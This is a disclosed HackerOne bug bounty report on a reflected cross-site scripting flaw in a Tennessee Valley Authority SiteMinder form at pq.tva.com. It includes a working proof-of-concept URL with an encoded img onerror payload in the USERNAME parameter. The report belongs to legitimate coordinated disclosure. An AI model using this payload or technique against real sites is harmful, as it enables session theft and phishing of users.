# xss reflected - pq.tva.com

## Report Details
- **Report ID**: 1362995
- **URL**: https://hackerone.com/reports/1362995
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-10-07T17:18:19.402Z
- **Disclosed**: 2023-09-11T11:51:23.486Z

## Reporter
- **Username**: thiagomarques
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: tennessee-valley-authority

## Vulnerability Information
POC: 

https://pq.tva.com/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020
src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7

## Impact

With the help of xss a hacker or attacker can perform social engineering on users by redirecting them from real website to fake one. hacker can steal their cookies and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.

## Attachments
- xss.png
